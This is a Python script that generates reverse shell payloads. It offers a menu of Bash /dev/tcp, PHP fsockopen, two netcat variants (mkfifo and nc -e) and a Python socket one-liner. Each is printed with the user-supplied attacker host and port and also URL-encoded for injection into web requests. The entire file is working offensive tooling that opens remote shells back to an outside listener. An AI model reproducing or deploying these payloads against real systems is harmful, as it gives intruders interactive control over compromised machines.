#!/usr/bin/python3

#Create By Cesar Isaac Lopez
#@issk
#pip3 install pwnlib ;pip3 install pwntools →→ It's not necesary
import argparse
import signal
import sys, urllib.parse
import time
from colorama import init, Fore, Back, Style
from pwn import *

## Gets IP and PORT from command line and parses them
ConnectionInfo = argparse.ArgumentParser()
ConnectionInfo.add_argument("host",  default=socket.gethostname())
ConnectionInfo.add_argument("port", type=int, default='58000')
ConnectionInfoParsed = ConnectionInfo.parse_args()

def exit(frame, sig):
	print("leaving...")
	sys.exit(1)
signal.signal(signal.SIGINT, exit)

ani =("""
                                                                                   César Isaac López
                                                                                   @issk
    ██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗███████╗██████╗  █████╗  ██████╗███████╗
    ██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
    ██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗  ███████╗██████╔╝███████║██║     █████╗  
    ██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝  ╚════██║██╔═══╝ ██╔══██║██║     ██╔══╝  
    ██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗███████║██║     ██║  ██║╚██████╗███████╗
    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝""")

print("\033[1;36m"+ani+'\033[0;m')
#print(Fore.BLACK+Back.WHITE+ani+Back.RESET)

def choose():
# variables 
	process = log.progress("choose a reverse shell")
	time.sleep(1)
	log.info("[1]Bash\n[2]PHP\n[3]NC (recommended)\n[4]Python\n[5]NC (basic)")
# Check reverse shells available
	bash = "bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"
	php = """php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'"""
	nc = 	'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f'
	python = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
	nc2 = 'nc -e /bin/bash 10.0.0.1 443'

def reverse():
	arg1 = sys.argv[1]
	arg2 = sys.argv[2]
	add = int(input("Put a number: "))
	if add == 1:
		log.info("Selected → bash")
		time.sleep(1)
		print("\033[1;31m"+"bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (arg1,  arg2))
		print("Url encode → "+"\033[1;31m"+urllib.parse.quote("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" % (arg1,  arg2)))
	elif add == 2:
		log.progress("Selected → php")
		time.sleep(1)
		print("\033[1;31m"+"""php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");""" % (arg1,  arg2))
		print("Url encode → "+"\033[1;31m"+urllib.parse.quote("""php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");""" % (arg1,  arg2)))
	elif add == 3:
		log.info("Select → nc (Recommended)")
		time.sleep(1)
		print("\033[1;31m"+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (arg1,  arg2))
		print("Url encode → "+"\033[1;31m"+urllib.parse.quote("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" % (arg1,  arg2)))
	elif add == 4:
		log.info("Select → python")
		time.sleep(1)
		python = print("\033[1;31m"+"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (arg1,  arg2))
		print("Url encode → "+"\033[1;31m"+urllib.parse.quote("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""" % (arg1,  arg2)))
	elif add == 5:
		log.info("Selected → nc (Basic)")
		time.sleep(1)
		print("\033[1;31m"+"nc -e /bin/bash %s %s" % (arg1,  arg2)+'\033[0;m')
		print("Url encode → "+"\033[1;31m"+urllib.parse.quote(("nc -e /bin/bash %s %s" % (arg1,  arg2)+'\033[0;m')))
	else:
		print("invalid selection...")
		print("Bye bye")
		sys.exit(1)

if __name__ == '__main__':
	choose()
	reverse()
print("")
print("\033[1;37m"+"Have a nice day :)")
